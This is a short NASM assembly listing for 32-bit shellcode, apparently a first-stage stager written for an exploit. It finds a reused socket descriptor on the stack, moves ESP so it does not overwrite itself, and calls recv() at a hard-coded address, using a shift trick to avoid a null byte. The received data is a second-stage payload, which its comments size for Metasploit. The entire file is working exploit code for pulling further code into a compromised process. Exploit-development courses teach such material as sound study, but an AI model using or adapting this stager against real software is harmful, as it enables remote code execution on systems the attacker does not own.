[BITS 32]

global _start			


section .text
_start:

; determine location of socket descriptor
; calculate offset from currrent ESP

push esp
pop eax
add ax, 0x188

;Adjust ESP because it is currently pointing below are stager area. 
;If we don't we will overwite our shellcode as we push and pop values onto the stack.  

sub esp, byte 0x64

; flags
xor ebx, ebx,
push ebx

;Buffer Size, 1024 bytes is big enough for a metasploit payload

add bh, 0x4
push ebx

;Address to store our payload when it is received. 
;Offset needs to be  below are second stage shellcode
;Need to calculate an offset based on ESP 

push esp
pop ebx
add ebx, byte 0x5C
add ebx, byte 0x5C
push ebx

; Push the saved socket onto the stack.  Since we don't need a pointer to the socket, we need to push the contents of the address pointed to by EAX

push dword [eax] 

;Make the call to recv()
;recv() is at 0040252C.  Since there is a null byte to deal will we will use the shift right instruction 

mov eax, 0x40252CFF
shr eax, 8
call eax
